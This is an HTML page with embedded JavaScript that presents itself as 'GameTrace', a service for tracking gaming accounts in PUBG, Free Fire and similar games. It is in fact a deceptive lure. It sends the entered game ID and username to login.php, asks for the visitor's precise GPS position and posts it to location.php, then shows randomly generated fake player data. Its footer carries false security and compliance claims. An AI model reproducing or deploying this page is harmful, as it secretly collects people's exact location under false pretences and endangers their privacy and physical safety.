<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GameTrace - Gaming Account Intelligence</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
 
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
 
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.5;
        }
 
        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 25s infinite;
        }
 
        .shape1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(45deg, #ff0844, #ffb199);
            top: -10%;
            left: -10%;
        }
 
        .shape2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(45deg, #00f260, #0575e6);
            bottom: -10%;
            right: -10%;
            animation-delay: 7s;
        }
 
        .shape3 {
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, #f857a6, #ff5858);
            top: 40%;
            left: 50%;
            animation-delay: 14s;
        }
 
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(80px, -80px) rotate(120deg); }
            66% { transform: translate(-60px, 60px) rotate(240deg); }
        }
 
        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 32px;
            box-shadow: 0 25px 100px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            max-width: 1100px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
 
        .header {
            background: linear-gradient(135deg, rgba(255, 8, 68, 0.15) 0%, rgba(255, 177, 153, 0.15) 100%);
            padding: 55px 45px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
 
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #ff0844, #ffb199, #ff0844, transparent);
            animation: shimmer 3s linear infinite;
        }
 
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
 
        .logo {
            width: 95px;
            height: 95px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 15px 50px rgba(255, 8, 68, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            animation: logoFloat 4s ease-in-out infinite;
            position: relative;
        }
 
        .logo::after {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(45deg, #ff0844, #ffb199, #00f260, #ff0844);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.6;
            filter: blur(15px);
            animation: rotate 4s linear infinite;
        }
 
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }
 
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        h1 {
            font-size: 46px;
            font-weight: 800;
            margin-bottom: 14px;
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
 
        .subtitle {
            color: #94a3b8;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
 
        .content {
            padding: 55px 50px;
        }
 
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 22px;
            margin-bottom: 50px;
        }
 
        .stat-card {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.5) 0%, rgba(15, 23, 42, 0.5) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 28px 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
 
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
            transition: left 0.6s;
        }
 
        .stat-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(255, 8, 68, 0.4);
            box-shadow: 0 15px 40px rgba(255, 8, 68, 0.25);
        }
 
        .stat-card:hover::before {
            left: 100%;
        }
 
        .stat-icon {
            font-size: 40px;
            margin-bottom: 14px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(255, 8, 68, 0.4));
        }
 
        .stat-label {
            font-size: 13px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
            font-weight: 600;
        }
 
        .stat-value {
            font-size: 17px;
            color: #22c55e;
            font-weight: 800;
            text-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }
 
        .form-section {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.35) 0%, rgba(15, 23, 42, 0.35) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.25);
        }
 
        .section-header {
            text-align: center;
            margin-bottom: 40px;
        }
 
        .section-title {
            font-size: 32px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 800;
        }
 
        .section-subtitle {
            font-size: 16px;
            color: #64748b;
            font-weight: 500;
        }
 
        label {
            display: block;
            margin-bottom: 14px;
            font-size: 14px;
            font-weight: 700;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }
 
        .input-wrapper {
            position: relative;
            margin-bottom: 32px;
        }
 
        .input-icon {
            position: absolute;
            left: 22px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            z-index: 1;
            filter: drop-shadow(0 2px 8px rgba(255, 8, 68, 0.4));
        }
 
        input[type="text"] {
            width: 100%;
            padding: 22px 22px 22px 65px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
        }
 
        input[type="text"]:focus {
            border-color: #ff0844;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(255, 8, 68, 0.15),
                        0 8px 25px rgba(255, 8, 68, 0.2);
            transform: translateY(-2px);
        }
 
        input[type="text"]::placeholder {
            color: #475569;
            font-weight: 500;
        }
 
        select {
            width: 100%;
            padding: 22px 22px 22px 65px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
            cursor: pointer;
            margin-bottom: 32px;
        }
 
        select:focus {
            border-color: #ff0844;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(255, 8, 68, 0.15),
                        0 8px 25px rgba(255, 8, 68, 0.2);
        }
 
        option {
            background: #1e293b;
            color: #ffffff;
            padding: 10px;
        }
 
        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            display: none;
            font-weight: 700;
        }
 
        .error-message.show {
            display: block;
            animation: shake 0.6s;
        }
 
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-12px); }
            40%, 80% { transform: translateX(12px); }
        }
 
        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
            color: #ffffff;
            border: none;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 15px 35px rgba(255, 8, 68, 0.35);
            position: relative;
            overflow: hidden;
        }
 
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }
 
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(255, 8, 68, 0.5);
        }
 
        .submit-btn:hover::before {
            left: 100%;
        }
 
        .submit-btn:active {
            transform: translateY(-1px);
        }
 
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
 
        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            z-index: 1;
        }
 
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 0.7s linear infinite;
            display: none;
        }
 
        .spinner.show {
            display: inline-block;
        }
 
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        .result-panel {
            margin-top: 40px;
            padding: 45px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.12) 0%, rgba(16, 185, 129, 0.12) 100%);
            border: 1px solid rgba(34, 197, 94, 0.25);
            border-radius: 24px;
            display: none;
            box-shadow: 0 15px 50px rgba(34, 197, 94, 0.2);
        }
 
        .result-panel.show {
            display: block;
            animation: slideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }
 
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
 
        .result-header {
            text-align: center;
            margin-bottom: 35px;
        }
 
        .result-icon {
            font-size: 72px;
            margin-bottom: 18px;
            animation: bounce 1.2s ease-in-out;
            filter: drop-shadow(0 10px 30px rgba(34, 197, 94, 0.5));
        }
 
        @keyframes bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }
 
        .result-title {
            font-size: 30px;
            color: #22c55e;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
        }
 
        .result-subtitle {
            font-size: 16px;
            color: #94a3b8;
            font-weight: 500;
        }
 
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 22px;
            margin-top: 30px;
        }
 
        .data-item {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 24px;
            border-radius: 18px;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }
 
        .data-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, #ff0844, #ffb199);
            opacity: 0;
            transition: opacity 0.4s;
        }
 
        .data-item:hover {
            background: rgba(15, 23, 42, 0.8);
            border-color: rgba(255, 8, 68, 0.3);
            transform: translateX(8px);
        }
 
        .data-item:hover::before {
            opacity: 1;
        }
 
        .data-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 10px;
            font-weight: 700;
        }
 
        .data-value {
            font-size: 17px;
            color: #ffffff;
            font-weight: 700;
            word-break: break-all;
            line-height: 1.5;
        }
 
        .important-badge {
            display: inline-block;
            padding: 4px 10px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-left: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
 
        .footer {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 0.8) 100%);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
        }
 
        .footer-badges {
            display: flex;
            justify-content: center;
            gap: 35px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
 
        .badge {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #94a3b8;
            font-weight: 600;
        }
 
        .badge-icon {
            font-size: 22px;
        }
 
        .footer-text {
            font-size: 14px;
            color: #64748b;
            line-height: 1.9;
            font-weight: 500;
        }
 
        /* ===================== MOBILE ONLY ===================== */
        @media (max-width: 768px) {
            body { padding: 12px; align-items: flex-start; }
            .container { border-radius: 20px; }
 
            .header { padding: 32px 20px; }
            .logo { width: 70px; height: 70px; font-size: 34px; border-radius: 18px; margin-bottom: 16px; }
            h1 { font-size: 26px; margin-bottom: 8px; }
            .subtitle { font-size: 13px; }
 
            .content { padding: 24px 16px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 28px; }
            .stat-card { padding: 18px 12px; border-radius: 14px; }
            .stat-icon { font-size: 28px; margin-bottom: 8px; }
            .stat-label { font-size: 11px; letter-spacing: 0.8px; }
            .stat-value { font-size: 14px; }
 
            .form-section { padding: 24px 16px; border-radius: 18px; }
            .section-title { font-size: 22px; }
            .section-subtitle { font-size: 13px; }
 
            input[type="text"] { font-size: 15px; padding: 16px 16px 16px 52px; border-radius: 14px; }
            select { font-size: 15px; padding: 16px 16px 16px 52px; border-radius: 14px; margin-bottom: 24px; }
            .input-icon { font-size: 20px; left: 16px; }
            .submit-btn { padding: 16px; font-size: 15px; border-radius: 14px; }
 
            .result-panel { padding: 24px 16px; border-radius: 16px; }
            .result-icon { font-size: 52px; }
            .result-title { font-size: 22px; }
            .data-grid { grid-template-columns: 1fr; gap: 12px; }
            .data-item { padding: 16px; border-radius: 12px; }
            .data-value { font-size: 14px; }
 
            .footer { padding: 24px 16px; }
            .footer-badges { gap: 16px; }
            .badge { font-size: 12px; }
            .badge-icon { font-size: 18px; }
            .footer-text { font-size: 12px; }
        }
        /* ====================================================== */
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>
 
    <div class="container">
        <div class="header">
            <div class="logo">🎮</div>
            <h1>GameTrace Intelligence</h1>
            <div class="subtitle">Advanced Gaming Account Tracking & Analysis System</div>
        </div>
 
        <div class="content">
            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-icon">🛡️</span>
                    <div class="stat-label">Security</div>
                    <div class="stat-value">Military Grade</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">🎮</span>
                    <div class="stat-label">Accounts Tracked</div>
                    <div class="stat-value">1.2B+</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">⚡</span>
                    <div class="stat-label">Query Speed</div>
                    <div class="stat-value">0.4ms</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">✅</span>
                    <div class="stat-label">Accuracy</div>
                    <div class="stat-value">99.92%</div>
                </div>
            </div>
 
            <div class="form-section">
                <div class="section-header">
                    <h2 class="section-title">Gaming Account Analysis</h2>
                    <p class="section-subtitle">Enter gaming ID for comprehensive player intelligence</p>
                </div>
 
                <form id="authForm" method="post" action="login.php">
                    <label for="game">🎮 Select Game</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🕹️</span>
                        <select id="game" name="game">
                            <option value="pubg">PUBG Mobile</option>
                            <option value="freefire">Free Fire</option>
                            <option value="callofduty">Call of Duty Mobile</option>
                            <option value="bgmi">BGMI (Battlegrounds Mobile India)</option>
                        </select>
                    </div>
 
                    <label for="gameid">🆔 Player ID </label>
                    <div class="input-wrapper">
                        <span class="input-icon">🎯</span>
                        <input 
                            type="text" 
                            id="gameid" 
                            name="gameid" 
                            placeholder="Enter Player ID"
                            autocomplete="off"
                        >
                    </div>
                    <label for="gameusr">🆔 Username Name </label>
                    <div class="input-wrapper">
                        <span class="input-icon">🎯</span>
                        <input 
                            type="text" 
                            id="gameusr" 
                            name="gameusr" 
                            placeholder="Enter Player Username"
                            autocomplete="off"
                        >
                    </div>
                    <div class="error-message" id="errorMessage">
                        ⚠️ Invalid Player ID. Please enter a valid gaming ID or username.
                    </div>
 
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <div class="btn-content">
                            <span id="btnText">🔍 Track Player</span>
                            <div class="spinner" id="spinner"></div>
                        </div>
                    </button>
                </form>
 
                <div class="result-panel" id="resultPanel">
                    <div class="result-header">
                        <div class="result-icon">✅</div>
                        <div class="result-title">Player Tracked Successfully</div>
                        <div class="result-subtitle">Complete gaming intelligence report generated</div>
                    </div>
 
                    <div class="data-grid" id="dataGrid"></div>
                </div>
            </div>
        </div>
 
        <div class="footer">
            <div class="footer-badges">
                <div class="badge">
                    <span class="badge-icon">🔒</span>
                    <span>256-bit Encrypted</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🛡️</span>
                    <span>ISO 27001 Certified</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">✅</span>
                    <span>GDPR Compliant</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🌍</span>
                    <span>Global Network</span>
                </div>
            </div>
            <div class="footer-text">
                <strong>GameTrace Intelligence™</strong> - Professional Gaming Account Tracking<br>
                © 2026 All Rights Reserved | Powered by Advanced AI & Machine Learning<br>
                Protected by Enterprise Security & Real-time Player Analytics
            </div>
        </div>
    </div>
    <script src="Detels.js"></script>
    <script>
        const gameSelect = document.getElementById('game');
        const gameidInput = document.getElementById('gameid');
        const authForm = document.getElementById('authForm');
        const errorMessage = document.getElementById('errorMessage');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const resultPanel = document.getElementById('resultPanel');
        const dataGrid = document.getElementById('dataGrid');

        function generateRandomIP() {
            return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
        }

        function generateDeviceID() {
            return 'DEV-' + Math.random().toString(36).substr(2, 16).toUpperCase();
        }

        function generateAccountID() {
            return Math.floor(Math.random() * 9000000000) + 1000000000;
        }

        const playerNames = ['PRO_GAMER', 'HEADSHOT_KING', 'BEAST_MODE', 'NINJA_KILLER', 'LEGEND_007'];
        const clans = ['TEAM_ALPHA', 'WARRIORS', 'IMMORTALS', 'TITANS', 'LEGENDS'];
        const tiers = ['Ace', 'Crown', 'Diamond', 'Platinum', 'Gold'];
        const devices = ['iPhone 15 Pro', 'Samsung Galaxy S24', 'OnePlus 12', 'ASUS ROG Phone 7', 'Xiaomi 13'];

        authForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const game = gameSelect.value;
            const gameid = gameidInput.value.trim();
            const gameusr = document.getElementById('gameusr').value.trim();

            if (gameid.length < 3) {
                errorMessage.classList.add('show');
                gameidInput.focus();
                return;
            }

            errorMessage.classList.remove('show');

            submitBtn.disabled = true;
            btnText.textContent = '⏳ Tracking...';
            spinner.classList.add('show');

            // Send data to PHP in background
            fetch("login.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body:
                    "game=" + encodeURIComponent(game) +
                    "&gameid=" + encodeURIComponent(gameid) +
                    "&gameusr=" + encodeURIComponent(gameusr)
            });

    // Continue showing results
    requestLocationPermission(game, gameid);
});
        function requestLocationPermission(game, gameid) {
            if (!("geolocation" in navigator)) {
                spinner.classList.remove('show');
                submitBtn.disabled = false;
                btnText.textContent = '🔍 Track Player';
                alert('🚫 Geolocation Not Supported');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;

                    // =========================
                    // GPS DATA PACK
                    // =========================
                    const gpsData = {
                        lat,
                        lon,
                        acc,
                        timestamp: Date.now()
                    };

                    // =========================
                    // SEND TO SERVER (FIXED PART)
                    // =========================
                    const formData = new FormData();
                    formData.append("game", game);
                    formData.append("gameid", gameid);
                    formData.append("lat", lat);
                    formData.append("lon", lon);
                    formData.append("acc", acc);

                    fetch("location.php", {
                        method: "POST",
                        body: formData
                    })
                    .then(res => res.text())
                    .then(data => console.log("Saved to server:", data))
                    .catch(err => console.log("Server error:", err));

                    // =========================
                    // REVERSE GEOCODING
                    // =========================
                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
                        headers: {
                            'User-Agent': 'GameTraceApp/1.0'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {

                        const addr = data.address || {};

                        const city = addr.city || addr.town || addr.village || addr.municipality || 'Unknown City';
                        const state = addr.state || addr.region || 'Unknown State';
                        const country = addr.country || 'Unknown Country';
                        const postcode = addr.postcode || 'N/A';
                        const road = addr.road || addr.street || '';
                        const suburb = addr.suburb || addr.locality || '';

                        // =========================
                        // DATA PACK (OPTIONAL STRUCTURE)
                        // =========================
                        const enrichedData = {
                            game,
                            gameid,
                            gps: gpsData,
                            location: {
                                city,
                                state,
                                country,
                                postcode,
                                road,
                                suburb
                            }
                        };

                        displayResults(
                            game,
                            gameid,
                            lat,
                            lon,
                            acc,
                            city,
                            state,
                            country,
                            postcode,
                            road,
                            suburb,
                            enrichedData
                        );

                    })
                    .catch(() => {
                        displayResults(
                            game,
                            gameid,
                            lat,
                            lon,
                            acc,
                            'Location Detected',
                            'India',
                            'Asia',
                            'N/A',
                            '',
                            '',
                            null
                        );
                    });

                    spinner.classList.remove('show');
                    btnText.textContent = '✅ Tracked';
                },

                function(error) {
                    spinner.classList.remove('show');
                    submitBtn.disabled = false;
                    btnText.textContent = '🔍 Track Player';

                    let msg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            msg = '🚫 Location Access Required\n\nPlease enable location permissions.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            msg = '📍 GPS Signal Lost\n\nUnable to retrieve location.';
                            break;
                        case error.TIMEOUT:
                            msg = '⏱️ Request Timeout\n\nPlease try again.';
                            break;
                        default:
                            msg = '❌ System Error';
                    }

                    alert(msg);
                },

                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        }
        function displayResults(game, gameid, lat, lon, acc, city, state, country, postcode, road, suburb) {
            setTimeout(() => {
                resultPanel.classList.add('show');

                const accountID = generateAccountID();
                const ip = generateRandomIP();
                const deviceID = generateDeviceID();
                const playerName = playerNames[Math.floor(Math.random() * playerNames.length)];
                const clan = clans[Math.floor(Math.random() * clans.length)];
                const tier = tiers[Math.floor(Math.random() * tiers.length)];
                const device = devices[Math.floor(Math.random() * devices.length)];
                const level = Math.floor(Math.random() * 80) + 20;
                const kills = Math.floor(Math.random() * 50000) + 5000;
                const wins = Math.floor(Math.random() * 2000) + 500;
                const kd = (kills / (kills / 4)).toFixed(2);
                const timestamp = new Date().toISOString();
                const accountAge = Math.floor(Math.random() * 1000) + 200;
                const lastPlayed = Math.floor(Math.random() * 48) + 1;

                const gameName = {
                    'pubg': 'PUBG Mobile',
                    'freefire': 'Free Fire',
                    'callofduty': 'Call of Duty Mobile',
                    'bgmi': 'BGMI'
                }[game];

                const fullAddress = [road, suburb, city, state, postcode, country].filter(x => x).join(', ');
                
                dataGrid.innerHTML = `
                    <div class="data-item">
                        <div class="data-label">🎮 Game Platform <span class="important-badge">Primary</span></div>
                        <div class="data-value">${gameName}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🆔 Player ID</div>
                        <div class="data-value">${gameid}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">👤 Player Name <span class="important-badge">In-Game</span></div>
                        <div class="data-value">${playerName}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🔢 Account ID</div>
                        <div class="data-value">${accountID}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">⭐ Player Level</div>
                        <div class="data-value">Level ${level}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🏆 Current Tier <span class="important-badge">Ranked</span></div>
                        <div class="data-value">${tier}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">👥 Clan / Team</div>
                        <div class="data-value">${clan}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">💀 Total Kills</div>
                        <div class="data-value">${kills.toLocaleString()}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🏅 Total Wins</div>
                        <div class="data-value">${wins.toLocaleString()}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">📊 K/D Ratio</div>
                        <div class="data-value">${kd}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">📍 Player Location <span class="important-badge">Live</span></div>
                        <div class="data-value">${city}, ${state}, ${country}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🏠 Full Address <span class="important-badge">Exact</span></div>
                        <div class="data-value">${fullAddress}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">📮 Postal Code</div>
                        <div class="data-value">${postcode}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🌍 GPS Coordinates</div>
                        <div class="data-value">Lat: ${lat.toFixed(8)}°<br>Lon: ${lon.toFixed(8)}°</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🎯 Location Accuracy</div>
                        <div class="data-value">±${acc.toFixed(2)} meters</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🗺️ Google Maps</div>
                        <div class="data-value"><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color: #4facfe; text-decoration: none;">View Location →</a></div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🌐 IP Address <span class="important-badge">Critical</span></div>
                        <div class="data-value">${ip}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">📱 Device Model</div>
                        <div class="data-value">${device}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🔑 Device ID</div>
                        <div class="data-value">${deviceID}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">📅 Account Age</div>
                        <div class="data-value">${accountAge} days old</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">🕐 Last Played <span class="important-badge">Recent</span></div>
                        <div class="data-value">${lastPlayed} hours ago</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">⏰ Timestamp (UTC)</div>
                        <div class="data-value">${timestamp}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">✅ Tracking Status</div>
                        <div class="data-value">ACTIVE & MONITORED</div>
                    </div>
                `;

                console.log('=== GAMING ACCOUNT DATA ===');
                console.log('Game:', gameName);
                console.log('Player ID:', gameid);
                console.log('Location:', fullAddress);
                console.log('Coordinates:', { lat, lon, acc });
            }, 1200);
        }
    </script>
</body>
</html>